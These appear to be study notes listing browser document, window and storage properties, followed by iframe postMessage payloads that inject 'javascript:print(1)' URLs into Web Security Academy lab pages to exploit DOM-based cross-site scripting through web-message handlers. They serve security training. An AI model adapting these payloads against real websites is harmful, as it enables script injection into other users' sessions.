## Document and Window Properties

### Common Document Properties
- `document.URL`: The URL of the current document.
- `document.documentURI`: The URI of the current document.
- `document.URLUnencoded`: (Deprecated) Unencoded URL of the document.
- `document.baseURI`: The base URI of the document.
- `location`: Provides the URL of the current document and allows navigation.

### Cookie and Referrer Information
- `document.cookie`: Allows access to cookies within the document's scope.
- `document.referrer`: Returns the URI of the document that linked to the current page.

### Window and History
- `window.name`: A property that persists across page loads and can store string data.
- `history.pushState`: Adds a state to the session history stack.
- `history.replaceState`: Modifies the current history entry.

---

## Storage APIs

- `localStorage`: Stores data with no expiration time. Data is accessible across browser sessions.
- `sessionStorage`: Stores data for the duration of the page session. Cleared when the page is closed.
- `IndexedDB`: A low-level API for client-side storage of significant amounts of structured data.

---

## Example: Iframe Behavior and Security Concerns

### Example 1: Using `postMessage` with Iframes
```html
<iframe 
  src="https://0a4100f704dad9d180771c2b00670016.web-security-academy.net/" 
  width="500" 
  height="500" 
  onload="this.contentWindow.postMessage('javascript:print(1)//http:', '*')">
</iframe>

<iframe 
  src="https://0af0005904bc15af80083a7d003d006f.web-security-academy.net/" 
  width="500" 
  height="500" 
  onload="this.contentWindow.postMessage('{
    \"type\": \"load_channel\",
    \"url\": \"javascript:print(1)\",
    \"width\": \"20\",
    \"height\":\"20\"
  }', '*')">
</iframe>

<iframe 
  src="https://0af0005904bc15af80083a7d003d006f.web-security-academy.net/" 
  width="500" 
  height="500" 
  onload="
    this.contentWindow.postMessage(JSON.stringify({ 
      type: 'page-load' 
    }), '*'); 
    this.contentWindow.postMessage(JSON.stringify({
      type: 'load-channel',
      url: 'javascript:print(1)'
    }), '*');
    this.contentWindow.postMessage(JSON.stringify({
      type: 'player-height-changed',
      width: 600,
      height: 400
    }), '*');
  ">
</iframe>
